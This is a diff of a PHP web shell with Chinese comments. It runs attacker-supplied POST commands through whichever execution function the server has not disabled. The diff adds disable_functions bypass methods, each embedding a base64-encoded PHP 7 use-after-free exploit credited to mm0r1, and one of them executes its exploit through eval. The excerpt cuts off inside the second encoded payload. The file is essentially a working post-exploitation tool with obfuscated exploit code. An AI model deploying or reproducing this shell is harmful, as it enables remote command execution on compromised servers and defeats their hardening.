@@ -1,125 +1,220 @@
 <?php
-    define('LINE','<br>');
+define('LINE', '<br>');
 
-    if (isset($_POST['encoding'])) {
-        header('Content-Type: text/html; charset=' . $_POST['encoding']);
+if (isset($_POST['encoding'])) {
+    header('Content-Type: text/html; charset=' . $_POST['encoding']);
+}
+
+
+/**
+ * 获取环境的基本信息
+ */
+function show_basic()
+{
+    $os = php_uname('s');
+    $hostname = php_uname('n');
+    $release = php_uname('r');
+    $version = php_uname('v');
+
+    echo '<pre>';
+    echo 'OS: ' . $os . LINE;
+    echo 'Hostname: ' . $hostname . LINE;
+    echo 'Release: ' . $release . LINE;
+    echo 'Version: ' . $version . LINE;
+    echo '</pre>';
+    echo '<hr>';
+}
+
+
+/**
+ * 获取php.ini中被禁用的函数名
+ * @param bool $display 是否显示disable_functions
+ * @return array disable_functions
+ */
+function get_disable($display = false)
+{
+    $func = ini_get('disable_functions');
+    $func = $func ? explode(',', $func) : array();
+
+    if ($display) {
+        echo (function_exists('pcntl_exec') ? 'pcntl_exec is available' : 'pcntl_exec is unavailable') . LINE;
+        echo 'disable_functions: ';
+        foreach ($func as $fun) {
+            echo $fun . " ";
+        }
+        echo LINE . LINE;
     }
+    return $func;
+}
 
 
-    /**
-     * 获取环境的基本信息
-     */
-    function show_basic() {
-        $os = php_uname('s');
-        $hostname = php_uname('n');
-        $release = php_uname('r');
-        $version = php_uname('v');
+/**
+ * 生成functions select下拉菜单
+ */
+function generate_funcs()
+{
+    echo '<select name="func">';
+    $available = array('shell_exec', 'system', 'exec', 'passthru', 'popen', 'proc_open', 'pcntl_exec');
+    $disable = get_disable(false);
 
-        echo '<pre>';
-        echo 'OS: ' . $os . LINE;
-        echo 'Hostname: ' . $hostname . LINE;
-        echo 'Release: ' . $release . LINE;
-        echo 'Version: ' . $version . LINE;
-        echo '</pre>';
-        echo '<hr>';
-    }
-
-
-    /**
-     * 获取php.ini中被禁用的函数名
-     * @param bool $display 是否显示disable_functions
-     * @return array disable_functions
-     */
-    function get_disable($display=false) {
-        $func = ini_get('disable_functions');
-        $func = $func ? explode(',',$func) : array();
-
-        if ($display) {
-            echo (function_exists('pcntl_exec') ? 'pcntl_exec is available' : 'pcntl_exec is unavailable') . LINE;
-            echo 'disable_functions: ';
-            foreach ($func as $fun) {
-                echo $fun . " ";
+    foreach ($available as $fun) {
+        if (!in_array($fun, $disable) && function_exists($fun)) {
+            // 参数记忆
+            if ($_POST['func'] == $fun) {
+                echo '<option selected>' . $fun . '</option>';
+                continue;
             }
-            echo LINE . LINE;
+            echo '<option>' . $fun . '</option>';
         }
-        return $func;
     }
+    echo '</select>';
+}
 
 
-    /**
-     * 生成select下拉菜单
-     */
-    function generate_select() {
-        echo '<select name="func">';
-        $available = array('shell_exec','system','exec','passthru','popen','proc_open','pcntl_exec');
-        $disable = get_disable(false);
+/**
+ * 生成 bypass methods select下拉菜单
+ */
+function generate_methods()
+{
+    echo '<select name="method">';
+    $methods = array('disable', 'php7-gc-bypass', 'php7-backtrace-bypass', 'php-json-bypass');
 
-        foreach ($available as $fun) {
-            if (!in_array($fun, $disable) && function_exists($fun)) {
-                // 参数记忆
-                if ($_POST['func'] == $fun) {
-                    echo '<option selected>' . $fun . '</option>';
-                    continue;
-                }
-                echo '<option>' . $fun . '</option>';
+    foreach ($methods as $method) {
+        // 参数记忆
+        if ($_POST['method'] == $method) {
+            echo '<option selected>' . $method . '</option>';
+            continue;
+        }
+        echo '<option>' . $method . '</option>';
+    }
+    echo '</select>';
+}
+
+
+/**
+ * 执行命令并显示执行结果
+ * @param $cmd 要执行的命令
+ */
+function exec_and_display($func, $cmd)
+{
+    echo '<pre>';
+    switch ($func) {
+        case 'shell_exec':
+            echo shell_exec($cmd);
+            break;
+        case 'exec':
+            exec($cmd, $res);
+            foreach ($res as $line) {
+                echo $line . LINE;
             }
-        }
-        echo '</select>';
+            break;
+        case 'system':
+            system($cmd);
+            break;
+        case 'passthru':
+            passthru($cmd);
+            break;
+        case 'popen':
+            $handle = popen($cmd, "r");
+            echo stream_get_contents($handle);
+            pclose($handle);
+            break;
+        case 'proc_open':
+            $arr = array(
+                0 => array('pipe', 'r'),
+                1 => array('pipe', 'w'),
+            );
+            $process = proc_open($cmd, $arr, $pipes); // pipes 文件指针
+            echo stream_get_contents($pipes[1]);
+            fclose($pipes[0]);
+            fclose($pipes[1]);
+            proc_close($process);
+            break;
+        case 'pcntl_exec':
+            // 此函数较特殊，CLI下可以使用，Web下需要判断
+            if (function_exists('pcntl_exec')) {
+                $args = explode(' ', $cmd);
+                array_unshift($args, '-c');
+                $shell = '/bin/sh';
+                pcntl_exec($shell, $args);
+            }
+            break;
     }
+    echo '</pre>';
+}
 
 
-    /**
-     * 执行命令并显示执行结果
-     * @param $cmd 要执行的命令
-     */
-    function exec_and_display($func,$cmd) {
-        echo '<pre>';
-        switch ($func) {
-            case 'shell_exec':
-                echo shell_exec($cmd);
-                break;
-            case 'exec':
-                exec($cmd,$res);
-                foreach ($res as $line) {
-                    echo $line . LINE;
-                }
-                break;
-            case 'system':
-                system($cmd);
-                break;
-            case 'passthru':
-                passthru($cmd);
-                break;
-            case 'popen':
-                $handle = popen($cmd, "r");
-                echo stream_get_contents($handle);
-                pclose($handle);
-                break;
-            case 'proc_open':
-                $arr = array(
-                    0 => array('pipe','r'),
-                    1 => array('pipe','w'),
-                );
-                $process = proc_open($cmd,$arr,$pipes); // pipes 文件指针
-                echo stream_get_contents($pipes[1]);
-                fclose($pipes[0]);
-                fclose($pipes[1]);
-                proc_close($process);
-                break;
-            case 'pcntl_exec':
-                // 此函数较特殊，CLI下可以使用，Web下需要判断
-                if (function_exists('pcntl_exec')) {
-                    $args = explode(' ',$cmd);
-                    array_unshift($args,'-c');
-                    $shell = '/bin/sh';
-                    pcntl_exec($shell,$args);
-                }
-                break;
-        }
-        echo '</pre>';
+/**
+ * 执行命令并显示执行结果
+ * @param $cmd 要执行的命令
+ */
+function bypass_exec($method, $cmd)
+{
+    echo '<pre>';
+    switch ($method) {
+        case 'php7-gc-bypass':
+            gc_bypass($cmd);
+            break;
+        case 'php7-backtrace-bypass':
+            backtrace_bypass($cmd);
+            break;
+        case 'php-json-bypass':
+            json_bypass($cmd);
+            break;
     }
+    echo '</pre>';
+}
+
+
+/**
+ * php7-gc-bypass
+ * @param $cmd 要执行的命令
+ */
+function gc_bypass($cmd)
+{
+# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
+#
+# Bug: https://bugs.php.net/bug.php?id=72530
+#
+# This exploit should work on all PHP 7.0-7.3 versions
+#
+# Author: https://github.com/mm0r1
+    $code = base64_decode("ICAgIGdsb2JhbCAkYWJjLCAkaGVscGVyOwoKICAgIGZ1bmN0aW9uIHN0cjJwdHIoJiRzdHIsICRwID0gMCwgJHMgPSA4KSB7CiAgICAgICAgJGFkZHJlc3MgPSAwOwogICAgICAgIGZvcigkaiA9ICRzLTE7ICRqID49IDA7ICRqLS0pIHsKICAgICAgICAgICAgJGFkZHJlc3MgPDw9IDg7CiAgICAgICAgICAgICRhZGRyZXNzIHw9IG9yZCgkc3RyWyRwKyRqXSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYWRkcmVzczsKICAgIH0KCiAgICBmdW5jdGlvbiBwdHIyc3RyKCRwdHIsICRtID0gOCkgewogICAgICAgICRvdXQgPSAiIjsKICAgICAgICBmb3IgKCRpPTA7ICRpIDwgJG07ICRpKyspIHsKICAgICAgICAgICAgJG91dCAuPSBjaHIoJHB0ciAmIDB4ZmYpOwogICAgICAgICAgICAkcHRyID4+PSA4OwogICAgICAgIH0KICAgICAgICByZXR1cm4gJG91dDsKICAgIH0KCiAgICBmdW5jdGlvbiB3cml0ZSgmJHN0ciwgJHAsICR2LCAkbiA9IDgpIHsKICAgICAgICAkaSA9IDA7CiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAkbjsgJGkrKykgewogICAgICAgICAgICAkc3RyWyRwICsgJGldID0gY2hyKCR2ICYgMHhmZik7CiAgICAgICAgICAgICR2ID4+PSA4OwogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBsZWFrKCRhZGRyLCAkcCA9IDAsICRzID0gOCkgewogICAgICAgIGdsb2JhbCAkYWJjLCAkaGVscGVyOwogICAgICAgIHdyaXRlKCRhYmMsIDB4NjgsICRhZGRyICsgJHAgLSAweDEwKTsKICAgICAgICAkbGVhayA9IHN0cmxlbigkaGVscGVyLT5hKTsKICAgICAgICBpZigkcyAhPSA4KSB7ICRsZWFrICU9IDIgPDwgKCRzICogOCkgLSAxOyB9CiAgICAgICAgcmV0dXJuICRsZWFrOwogICAgfQoKICAgIGZ1bmN0aW9uIHBhcnNlX2VsZigkYmFzZSkgewogICAgICAgICRlX3R5cGUgPSBsZWFrKCRiYXNlLCAweDEwLCAyKTsKCiAgICAgICAgJGVfcGhvZmYgPSBsZWFrKCRiYXNlLCAweDIwKTsKICAgICAgICAkZV9waGVudHNpemUgPSBsZWFrKCRiYXNlLCAweDM2LCAyKTsKICAgICAgICAkZV9waG51bSA9IGxlYWsoJGJhc2UsIDB4MzgsIDIpOwoKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8ICRlX3BobnVtOyAkaSsrKSB7CiAgICAgICAgICAgICRoZWFkZXIgPSAkYmFzZSArICRlX3Bob2ZmICsgJGkgKiAkZV9waGVudHNpemU7CiAgICAgICAgICAgICRwX3R5cGUgID0gbGVhaygkaGVhZGVyLCAwLCA0KTsKICAgICAgICAgICAgJHBfZmxhZ3MgPSBsZWFrKCRoZWFkZXIsIDQsIDQpOwogICAgICAgICAgICAkcF92YWRkciA9IGxlYWsoJGhlYWRlciwgMHgxMCk7CiAgICAgICAgICAgICRwX21lbXN6ID0gbGVhaygkaGVhZGVyLCAweDI4KTsKCiAgICAgICAgICAgIGlmKCRwX3R5cGUgPT0gMSAmJiAkcF9mbGFncyA9PSA2KSB7CiAgICAgICAgICAgICAgICAkZGF0YV9hZGRyID0gJGVfdHlwZSA9PSAyID8gJHBfdmFkZHIgOiAkYmFzZSArICRwX3ZhZGRyOwogICAgICAgICAgICAgICAgJGRhdGFfc2l6ZSA9ICRwX21lbXN6OwogICAgICAgICAgICB9IGVsc2UgaWYoJHBfdHlwZSA9PSAxICYmICRwX2ZsYWdzID09IDUpIHsKICAgICAgICAgICAgICAgICR0ZXh0X3NpemUgPSAkcF9tZW1zejsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYoISRkYXRhX2FkZHIgfHwgISR0ZXh0X3NpemUgfHwgISRkYXRhX3NpemUpCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKCiAgICAgICAgcmV0dXJuIFskZGF0YV9hZGRyLCAkdGV4dF9zaXplLCAkZGF0YV9zaXplXTsKICAgIH0KCiAgICBmdW5jdGlvbiBnZXRfYmFzaWNfZnVuY3MoJGJhc2UsICRlbGYpIHsKICAgICAgICBsaXN0KCRkYXRhX2FkZHIsICR0ZXh0X3NpemUsICRkYXRhX3NpemUpID0gJGVsZjsKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8ICRkYXRhX3NpemUgLyA4OyAkaSsrKSB7CiAgICAgICAgICAgICRsZWFrID0gbGVhaygkZGF0YV9hZGRyLCAkaSAqIDgpOwogICAgICAgICAgICBpZigkbGVhayAtICRiYXNlID4gMCAmJiAkbGVhayAtICRiYXNlIDwgJGRhdGFfYWRkciAtICRiYXNlKSB7CiAgICAgICAgICAgICAgICAkZGVyZWYgPSBsZWFrKCRsZWFrKTsKICAgICAgICAgICAgICAgIGlmKCRkZXJlZiAhPSAweDc0NmU2MTc0NzM2ZTZmNjMpCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0gZWxzZSBjb250aW51ZTsKCiAgICAgICAgICAgICRsZWFrID0gbGVhaygkZGF0YV9hZGRyLCAoJGkgKyA0KSAqIDgpOwogICAgICAgICAgICBpZigkbGVhayAtICRiYXNlID4gMCAmJiAkbGVhayAtICRiYXNlIDwgJGRhdGFfYWRkciAtICRiYXNlKSB7CiAgICAgICAgICAgICAgICAkZGVyZWYgPSBsZWFrKCRsZWFrKTsKICAgICAgICAgICAgICAgIGlmKCRkZXJlZiAhPSAweDc4NjU2ODMyNmU2OTYyKQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9IGVsc2UgY29udGludWU7CgogICAgICAgICAgICByZXR1cm4gJGRhdGFfYWRkciArICRpICogODsKICAgICAgICB9CiAgICB9CgogICAgZnVuY3Rpb24gZ2V0X2JpbmFyeV9iYXNlKCRiaW5hcnlfbGVhaykgewogICAgICAgICRiYXNlID0gMDsKICAgICAgICAkc3RhcnQgPSAkYmluYXJ5X2xlYWsgJiAweGZmZmZmZmZmZmZmZmYwMDA7CiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAweDEwMDA7ICRpKyspIHsKICAgICAgICAgICAgJGFkZHIgPSAkc3RhcnQgLSAweDEwMDAgKiAkaTsKICAgICAgICAgICAgJGxlYWsgPSBsZWFrKCRhZGRyLCAwLCA3KTsKICAgICAgICAgICAgaWYoJGxlYWsgPT0gMHgxMDEwMjQ2NGM0NTdmKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gJGFkZHI7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgZnVuY3Rpb24gZ2V0X3N5c3RlbSgkYmFzaWNfZnVuY3MpIHsKICAgICAgICAkYWRkciA9ICRiYXNpY19mdW5jczsKICAgICAgICBkbyB7CiAgICAgICAgICAgICRmX2VudHJ5ID0gbGVhaygkYWRkcik7CiAgICAgICAgICAgICRmX25hbWUgPSBsZWFrKCRmX2VudHJ5LCAwLCA2KTsKCiAgICAgICAgICAgIGlmKCRmX25hbWUgPT0gMHg2ZDY1NzQ3Mzc5NzMpIHsKICAgICAgICAgICAgICAgIHJldHVybiBsZWFrKCRhZGRyICsgOCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGFkZHIgKz0gMHgyMDsKICAgICAgICB9IHdoaWxlKCRmX2VudHJ5ICE9IDApOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBjbGFzcyByeWF0IHsKICAgICAgICB2YXIgJHJ5YXQ7CiAgICAgICAgdmFyICRjaHRnOwogICAgICAgIAogICAgICAgIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKQogICAgICAgIHsKICAgICAgICAgICAgJHRoaXMtPmNodGcgPSAkdGhpcy0+cnlhdDsKICAgICAgICAgICAgJHRoaXMtPnJ5YXQgPSAxOwogICAgICAgIH0KICAgIH0KCiAgICBjbGFzcyBIZWxwZXIgewogICAgICAgIHB1YmxpYyAkYSwgJGIsICRjLCAkZDsKICAgIH0KCiAgICBpZihzdHJpc3RyKFBIUF9PUywgJ1dJTicpKSB7CiAgICAgICAgZGllKCdUaGlzIFBvQyBpcyBmb3IgKm5peCBzeXN0ZW1zIG9ubHkuJyk7CiAgICB9CgogICAgJG5fYWxsb2MgPSAxMDsKCiAgICAkY29udGlndW91cyA9IFtdOwogICAgZm9yKCRpID0gMDsgJGkgPCAkbl9hbGxvYzsgJGkrKykKICAgICAgICAkY29udGlndW91c1tdID0gc3RyX3JlcGVhdCgnQScsIDc5KTsKCiAgICAkcG9jID0gJ2E6NDp7aTowO2k6MTtpOjE7YToxOntpOjA7Tzo0OiJyeWF0IjoyOntzOjQ6InJ5YXQiO1I6MztzOjQ6ImNodGciO2k6Mjt9fWk6MTtpOjM7aToyO1I6NTt9JzsKICAgICRvdXQgPSB1bnNlcmlhbGl6ZSgkcG9jKTsKICAgIGdjX2NvbGxlY3RfY3ljbGVzKCk7CgogICAgJHYgPSBbXTsKICAgICR2WzBdID0gcHRyMnN0cigwLCA3OSk7CiAgICB1bnNldCgkdik7CiAgICAkYWJjID0gJG91dFsyXVswXTsKCiAgICAkaGVscGVyID0gbmV3IEhlbHBlcjsKICAgICRoZWxwZXItPmIgPSBmdW5jdGlvbiAoJHgpIHsgfTsKCiAgICBpZihzdHJsZW4oJGFiYykgPT0gNzkgfHwgc3RybGVuKCRhYmMpID09IDApIHsKICAgICAgICBkaWUoIlVBRiBmYWlsZWQiKTsKICAgIH0KICAgIAogICAgJGNsb3N1cmVfaGFuZGxlcnMgPSBzdHIycHRyKCRhYmMsIDApOwogICAgJHBocF9oZWFwID0gc3RyMnB0cigkYWJjLCAweDU4KTsKICAgICRhYmNfYWRkciA9ICRwaHBfaGVhcCAtIDB4Yzg7CiAgICAKICAgIHdyaXRlKCRhYmMsIDB4NjAsIDIpOwogICAgd3JpdGUoJGFiYywgMHg3MCwgNik7CiAgICAKICAgIHdyaXRlKCRhYmMsIDB4MTAsICRhYmNfYWRkciArIDB4NjApOwogICAgd3JpdGUoJGFiYywgMHgxOCwgMHhhKTsKCiAgICAkY2xvc3VyZV9vYmogPSBzdHIycHRyKCRhYmMsIDB4MjApOwoKICAgICRiaW5hcnlfbGVhayA9IGxlYWsoJGNsb3N1cmVfaGFuZGxlcnMsIDgpOwogICAgaWYoISgkYmFzZSA9IGdldF9iaW5hcnlfYmFzZSgkYmluYXJ5X2xlYWspKSkgewogICAgICAgIGRpZSgiQ291bGRuJ3QgZGV0ZXJtaW5lIGJpbmFyeSBiYXNlIGFkZHJlc3MiKTsKICAgIH0KCiAgICBpZighKCRlbGYgPSBwYXJzZV9lbGYoJGJhc2UpKSkgewogICAgICAgIGRpZSgiQ291bGRuJ3QgcGFyc2UgRUxGIGhlYWRlciIpOwogICAgfQoKICAgIGlmKCEoJGJhc2ljX2Z1bmNzID0gZ2V0X2Jhc2ljX2Z1bmNzKCRiYXNlLCAkZWxmKSkpIHsKICAgICAgICBkaWUoIkNvdWxkbid0IGdldCBiYXNpY19mdW5jdGlvbnMgYWRkcmVzcyIpOwogICAgfQoKICAgIGlmKCEoJHppZl9zeXN0ZW0gPSBnZXRfc3lzdGVtKCRiYXNpY19mdW5jcykpKSB7CiAgICAgICAgZGllKCJDb3VsZG4ndCBnZXQgemlmX3N5c3RlbSBhZGRyZXNzIik7CiAgICB9CiAgICAKICAgICRmYWtlX29ial9vZmZzZXQgPSAweGQwOwogICAgZm9yKCRpID0gMDsgJGkgPCAweDExMDsgJGkgKz0gOCkgewogICAgICAgIHdyaXRlKCRhYmMsICRmYWtlX29ial9vZmZzZXQgKyAkaSwgbGVhaygkY2xvc3VyZV9vYmosICRpKSk7CiAgICB9CiAgICAKICAgIHdyaXRlKCRhYmMsIDB4MjAsICRhYmNfYWRkciArICRmYWtlX29ial9vZmZzZXQpOwogICAgd3JpdGUoJGFiYywgMHhkMCArIDB4MzgsIDEsIDQpOwogICAgd3JpdGUoJGFiYywgMHhkMCArIDB4NjgsICR6aWZfc3lzdGVtKTs=");
+    // unsafe eval
+    eval($code . "(\$helper->b)($cmd);");
+}
+
+
+function backtrace_bypass($cmd)
+{
+# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
+#
+# Bug: https://bugs.php.net/bug.php?id=76047
+# debug_backtrace() returns a reference to a variable
+# that has been destroyed, causing a UAF vulnerability.
+#
+# This exploit should work on all PHP 7.0-7.4 versions
+# released as of 30/01/2020.
+#
+# Author: https://github.com/mm0r1
+    $code = base64_decode("IGdsb2JhbCAkYWJjLCAkaGVscGVyLCAkYmFja3RyYWNlOwoKICAgIGNsYXNzIFZ1bG4gewogICAgICAgIHB1YmxpYyAkYTsKICAgICAgICBwdWJsaWMgZnVuY3Rpb24gX19kZXN0cnVjdCgpIHsgCiAgICAgICAgICAgIGdsb2JhbCAkYmFja3RyYWNlOyAKICAgICAgICAgICAgdW5zZXQoJHRoaXMtPmEpOwogICAgICAgICAgICAkYmFja3RyYWNlID0gKG5ldyBFeGNlcHRpb24pLT5nZXRUcmFjZSgpOwogICAgICAgICAgICBpZighaXNzZXQoJGJhY2t0cmFjZVsxXVsnYXJncyddKSkgewogICAgICAgICAgICAgICAgJGJhY2t0cmFjZSA9IGRlYnVnX2JhY2t0cmFjZSgpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIGNsYXNzIEhlbHBlciB7CiAgICAgICAgcHVibGljICRhLCAkYiwgJGMsICRkOwogICAgfQoKICAgIGZ1bmN0aW9uIHN0cjJwdHIoJiRzdHIsICRwID0gMCwgJHMgPSA4KSB7CiAgICAgICAgJGFkZHJlc3MgPSAwOwogICAgICAgIGZvcigkaiA9ICRzLTE7ICRqID49IDA7ICRqLS0pIHsKICAgICAgICAgICAgJGFkZHJlc3MgPDw9IDg7CiAgICAgICAgICAgICRhZGRyZXNzIHw9IG9yZCgkc3RyWyRwKyRqXSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYWRkcmVzczsKICAgIH0KCiAgICBmdW5jdGlvbiBwdHIyc3RyKCRwdHIsICRtID0gOCkgewogICAgICAgICRvdXQgPSAiIjsKICAgICAgICBmb3IgKCRpPTA7ICRpIDwgJG07ICRpKyspIHsKICAgICAgICAgICAgJG91dCAuPSBjaHIoJHB0ciAmIDB4ZmYpOwogICAgICAgICAgICAkcHRyID4+PSA4OwogICAgICAgIH0KICAgICAgICByZXR1cm4gJG91dDsKICAgIH0KCiAgICBmdW5jdGlvbiB3cml0ZSgmJHN0ciwgJHAsICR2LCAkbiA9IDgpIHsKICAgICAgICAkaSA9IDA7CiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAkbjsgJGkrKykgewogICAgICAgICAgICAkc3RyWyRwICsgJGldID0gY2hyKCR2ICYgMHhmZik7CiAgICAgICAgICAgICR2ID4+PSA4OwogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBsZWFrKCRhZGRyLCAkcCA9IDAsICRzID0gOCkgewogICAgICAgIGdsb2JhbCAkYWJjLCAkaGVscGVyOwogICAgICAgIHdyaXRlKCRhYmMsIDB4NjgsICRhZGRyICsgJHAgLSAweDEwKTsKICAgICAgICAkbGVhayA9IHN0cmxlbigkaGVscGVyLT5hKTsKICAgICAgICBpZigkcyAhPSA4KSB7ICRsZWFrICU9IDIgPDwgKCRzICogOCkgLSAxOyB9CiAgICAgICAgcmV0dXJuICRsZWFrOwogICAgfQoKICAgIGZ1bmN0aW9uIHBhcnNlX2VsZigkYmFzZSkgewogICAgICAgICRlX3R5cGUgPSBsZWFrKCRiYXNlLCAweDEwLCAyKTsKCiAgICAgICAgJGVfcGhvZmYgPSBsZWFrKCRiYXNlLCAweDIwKTsKICAgICAgICAkZV9waGVudHNpemUgPSBsZWFrKCRiYXNlLCAweDM2LCAyKTsKICAgICAgICAkZV9waG51bSA9IGxlYWsoJGJhc2UsIDB4MzgsIDIpOwoKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8ICRlX3BobnVtOyAkaSsrKSB7CiAgICAgICAgICAgICRoZWFkZXIgPSAkYmFzZSArICRlX3Bob2ZmICsgJGkgKiAkZV9waGVudHNpemU7CiAgICAgICAgICAgICRwX3R5cGUgID0gbGVhaygkaGVhZGVyLCAwLCA0KTsKICAgICAgICAgICAgJHBfZmxhZ3MgPSBsZWFrKCRoZWFkZXIsIDQsIDQpOwogICAgICAgICAgICAkcF92YWRkciA9IGxlYWsoJGhlYWRlciwgMHgxMCk7CiAgICAgICAgICAgICRwX21lbXN6ID0gbGVhaygkaGVhZGVyLCAweDI4KTsKCiAgICAgICAgICAgIGlmKCRwX3R5cGUgPT0gMSAmJiAkcF9mbGFncyA9PSA2KSB7CiAgICAgICAgICAgICAgICAkZGF0YV9hZGRyID0gJGVfdHlwZSA9PSAyID8gJHBfdmFkZHIgOiAkYmFzZSArICRwX3ZhZGRyOwogICAgICAgICAgICAgICAgJGRhdGFfc2l6ZSA9ICRwX21lbXN6OwogICAgICAgICAgICB9IGVsc2UgaWYoJHBfdHlwZSA9PSAxICYmICRwX2ZsYWdzID09IDUpIHsKICAgICAgICAgICAgICAgICR0ZXh0X3NpemUgPSAkcF9tZW1zejsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYoISRkYXRhX2FkZHIgfHwgISR0ZXh0X3NpemUgfHwgISRkYXRhX3NpemUpCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKCiAgICAgICAgcmV0dXJuIFskZGF0YV9hZGRyLCAkdGV4dF9zaXplLCAkZGF0YV9zaXplXTsKICAgIH0KCiAgICBmdW5jdGlvbiBnZXRfYmFzaWNfZnVuY3MoJGJhc2UsICRlbGYpIHsKICAgICAgICBsaXN0KCRkYXRhX2FkZHIsICR0ZXh0X3NpemUsICRkYXRhX3NpemUpID0gJGVsZjsKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8ICRkYXRhX3NpemUgLyA4OyAkaSsrKSB7CiAgICAgICAgICAgICRsZWFrID0gbGVhaygkZGF0YV9hZGRyLCAkaSAqIDgpOwogICAgICAgICAgICBpZigkbGVhayAtICRiYXNlID4gMCAmJiAkbGVhayAtICRiYXNlIDwgJGRhdGFfYWRkciAtICRiYXNlKSB7CiAgICAgICAgICAgICAgICAkZGVyZWYgPSBsZWFrKCRsZWFrKTsKICAgICAgICAgICAgICAgIGlmKCRkZXJlZiAhPSAweDc0NmU2MTc0NzM2ZTZmNjMpCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0gZWxzZSBjb250aW51ZTsKCiAgICAgICAgICAgICRsZWFrID0gbGVhaygkZGF0YV9hZGRyLCAoJGkgKyA0KSAqIDgpOwogICAgICAgICAgICBpZigkbGVhayAtICRiYXNlID4gMCAmJiAkbGVhayAtICRiYXNlIDwgJGRhdGFfYWRkciAtICRiYXNlKSB7CiAgICAgICAgICAgICAgICAkZGVyZWYgPSBsZWFrKCRsZWFrKTsKICAgICAgICAgICAgICAgIGlmKCRkZXJlZiAhPSAweDc4NjU2ODMyNmU2OTYyKQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9IGVsc2UgY29udGludWU7CgogICAgICAgICAgICByZXR1cm4gJGRhdGFfYWRkciArICRpICogODsKICAgICAgICB9CiAgICB9CgogICAgZnVuY3Rpb24gZ2V0X2JpbmFyeV9iYXNlKCRiaW5hcnlfbGVhaykgewogICAgICAgICRiYXNlID0gMDsKICAgICAgICAkc3RhcnQgPSAkYmluYXJ5X2xlYWsgJiAweGZmZmZmZmZmZmZmZmYwMDA7CiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAweDEwMDA7ICRpKyspIHsKICAgICAgICAgICAgJGFkZHIgPSAkc3RhcnQgLSAweDEwMDAgKiAkaTsKICAgICAgICAgICAgJGxlYWsgPSBsZWFrKCRhZGRyLCAwLCA3KTsKICAgICAgICAgICAgaWYoJGxlYWsgPT0gMHgxMDEwMjQ2NGM0NTdmKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gJGFkZHI7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgZnVuY3Rpb24gZ2V0X3N5c3RlbSgkYmFzaWNfZnVuY3MpIHsKICAgICAgICAkYWRkciA9ICRiYXNpY19mdW5jczsKICAgICAgICBkbyB7CiAgICAgICAgICAgICRmX2VudHJ5ID0gbGVhaygkYWRkcik7CiAgICAgICAgICAgICRmX25hbWUgPSBsZWFrKCRmX2VudHJ5LCAwLCA2KTsKCiAgICAgICAgICAgIGlmKCRmX25hbWUgPT0gMHg2ZDY1NzQ3Mzc5NzMpIHsKICAgICAgICAgICAgICAgIHJldHVybiBsZWFrKCRhZGRyICsgOCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGFkZHIgKz0gMHgyMDsKICAgICAgICB9IHdoaWxlKCRmX2VudHJ5ICE9IDApOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBmdW5jdGlvbiB0cmlnZ2VyX3VhZigkYXJnKSB7CiAgICAgICAgJGFyZyA9IHN0cl9zaHVmZmxlKHN0cl9yZXBlYXQoJ0EnLCA3OSkpOwogICAgICAgICR2dWxuID0gbmV3IFZ1bG4oKTsKICAgICAgICAkdnVsbi0+YSA9ICRhcmc7CiAgICB9CgogICAgaWYoc3RyaXN0cihQSFBfT1MsICdXSU4nKSkgewogICAgICAgIGRpZSgnVGhpcyBQb0MgaXMgZm9yICpuaXggc3lzdGVtcyBvbmx5LicpOwogICAgfQoKICAgICRuX2FsbG9jID0gMTA7CiAgICAkY29udGlndW91cyA9IFtdOwogICAgZm9yKCRpID0gMDsgJGkgPCAkbl9hbGxvYzsgJGkrKykKICAgICAgICAkY29udGlndW91c1tdID0gc3RyX3NodWZmbGUoc3RyX3JlcGVhdCgnQScsIDc5KSk7CgogICAgdHJpZ2dlcl91YWYoJ3gnKTsKICAgICRhYmMgPSAkYmFja3RyYWNlWzFdWydhcmdzJ11bMF07CgogICAgJGhlbHBlciA9IG5ldyBIZWxwZXI7CiAgICAkaGVscGVyLT5iID0gZnVuY3Rpb24gKCR4KSB7IH07CgogICAgaWYoc3RybGVuKCRhYmMpID09IDc5IHx8IHN0cmxlbigkYWJjKSA9PSAwKSB7CiAgICAgICAgZGllKCJVQUYgZmFpbGVkIik7CiAgICB9CgogICAgJGNsb3N1cmVfaGFuZGxlcnMgPSBzdHIycHRyKCRhYmMsIDApOwogICAgJHBocF9oZWFwID0gc3RyMnB0cigkYWJjLCAweDU4KTsKICAgICRhYmNfYWRkciA9ICRwaHBfaGVhcCAtIDB4Yzg7CgogICAgd3JpdGUoJGFiYywgMHg2MCwgMik7CiAgICB3cml0ZSgkYWJjLCAweDcwLCA2KTsKCiAgICB3cml0ZSgkYWJjLCAweDEwLCAkYWJjX2FkZHIgKyAweDYwKTsKICAgIHdyaXRlKCRhYmMsIDB4MTgsIDB4YSk7CgogICAgJGNsb3N1cmVfb2JqID0gc3RyMnB0